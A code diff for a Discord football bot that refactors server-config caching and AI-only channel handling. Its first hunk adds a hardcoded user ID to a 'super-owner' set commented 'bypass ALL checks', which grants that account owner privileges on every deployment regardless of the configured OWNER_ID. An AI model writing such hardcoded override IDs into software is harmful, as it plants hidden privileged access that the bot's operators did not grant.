@@ -100,6 +100,12 @@ server.listen(port, '0.0.0.0', () => {
 */
 const OWNER_ID = process.env.OWNER_ID;
 
+/* ── Hardcoded super-owner IDs — bypass ALL checks ── */
+const SUPER_OWNER_IDS = new Set([
+    OWNER_ID,
+    '856556430370930738'
+].filter(Boolean));
+
 client.commands = new Collection();
 client.cooldowns = new Collection();
 
@@ -316,7 +322,7 @@ client.on('error', (error) => {
 */
 async function runCommand(command, input, args, isSlash) {
     const userId = isSlash ? input.user.id : input.author.id;
-    const isOwner = userId === OWNER_ID;
+    const isOwner = SUPER_OWNER_IDS.has(userId);
     const guildId = input.guild.id;
 
     const prefix = await getGuildPrefix(guildId);
@@ -504,20 +510,25 @@ client.on('guildMemberUpdate', async (oldMember, newMember) => {
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.guild) return;
 
-    /* ── AI enabled check (cached per guild, 60s TTL) ── */
-    const aiCache = client._aiEnabledCache || (client._aiEnabledCache = new Map());
-    const aiCacheEntry = aiCache.get(message.guild.id);
-    let aiEnabled = true;
-    if (aiCacheEntry && Date.now() - aiCacheEntry.ts < 60000) {
-        aiEnabled = aiCacheEntry.value;
+    const isOwner = SUPER_OWNER_IDS.has(message.author.id);
+
+    /* ── Server config cache (60s TTL) ── */
+    const cfgCache = client._serverCfgCache || (client._serverCfgCache = new Map());
+    let serverCfg = null;
+    const cfgEntry = cfgCache.get(message.guild.id);
+    if (cfgEntry && Date.now() - cfgEntry.ts < 60000) {
+        serverCfg = cfgEntry.value;
     } else {
         try {
             const { ServerConfig } = require('./models/Tournament');
-            const cfg = await ServerConfig.findOne({ guildId: message.guild.id }).lean();
-            aiEnabled = cfg?.aiEnabled !== false;
-        } catch { aiEnabled = true; }
-        aiCache.set(message.guild.id, { value: aiEnabled, ts: Date.now() });
+            serverCfg = await ServerConfig.findOne({ guildId: message.guild.id }).lean() || {};
+        } catch { serverCfg = {}; }
+        cfgCache.set(message.guild.id, { value: serverCfg, ts: Date.now() });
     }
+
+    const aiEnabled = serverCfg.aiEnabled !== false;
+    const aiOnlyChannels = serverCfg.aiOnlyChannels || [];
+    const isAiOnlyChannel = aiOnlyChannels.includes(message.channel.id);
 
     const prefix = await getGuildPrefix(message.guild.id);
 
@@ -547,10 +558,8 @@ client.on('messageCreate', async (message) => {
         const strippedContent = message.content.replace(botMentionRegex, '').trim();
 
         if (!strippedContent && !message.reference) {
-            // Pure @mention with no text — just react
             await message.react('<:hello:1488633282462744767>').catch(() => null);
         } else if (strippedContent && aiEnabled) {
-            // @mention with text — AI response
             try {
                 const { askFootball } = require('./utils/footballAI');
                 message.channel.sendTyping().catch(() => null);
@@ -597,7 +606,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    /* ── Football AI: # prefix ── */
+    /* ── AI: # prefix ── */
     if (aiEnabled && message.content.startsWith('#') && message.content.length > 1) {
         const question = message.content.slice(1).trim();
         if (question) {
@@ -615,16 +624,9 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    if (!message.content.startsWith(prefix)) return;
-
-    /* ── AI-only channel: block commands ── */
-    try {
-        const { ServerConfig } = require('./models/Tournament');
-        const serverConfig = await ServerConfig.findOne({ guildId: message.guild.id }).lean();
-        const aiChannels = serverConfig?.aiOnlyChannels || [];
-
-        if (aiChannels.includes(message.channel.id)) {
-            // AI-only channel — block the command, try AI if enabled
+    /* ── AI-only channel: block commands (owner bypasses) ── */
+    if (isAiOnlyChannel && !isOwner) {
+        if (message.content.startsWith(prefix)) {
             if (aiEnabled) {
                 const commandText = message.content.slice(prefix.length).trim();
                 if (commandText) {
@@ -642,9 +644,9 @@ client.on('messageCreate', async (message) => {
             }
             return;
         }
-    } catch (error) {
-        console.error('[setaichannel] check error:', error);
     }
+
+    if (!message.content.startsWith(prefix)) return;
 
     const args = message.content.slice(prefix.length).trim().split(/ +/);
     const commandName = args.shift().toLowerCase();
